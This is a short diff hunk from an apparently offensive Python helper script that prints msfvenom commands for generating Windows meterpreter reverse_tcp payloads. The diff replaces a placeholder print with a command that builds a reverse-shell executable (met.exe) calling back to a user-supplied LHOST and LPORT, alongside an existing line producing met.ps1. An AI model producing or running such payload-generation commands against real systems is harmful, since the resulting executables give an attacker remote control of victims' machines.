@@ -29,7 +29,7 @@ if start == "y":
         print("msfvenom -p windows/meterpreter/reverse_tcp LHOST=" + LHOST + " LPORT=" + LPORT + " -f exe -o met.ps1")
     if gen1 == "e":
         print("making executable application")
-        print("exe")
+        print("msfvenom -p windows/meterpreter/reverse_tcp LHOST=" + LHOST + " LPORT=" + LPORT + " -f exe -o met.exe")
 
     else:
         print("Exiting...")
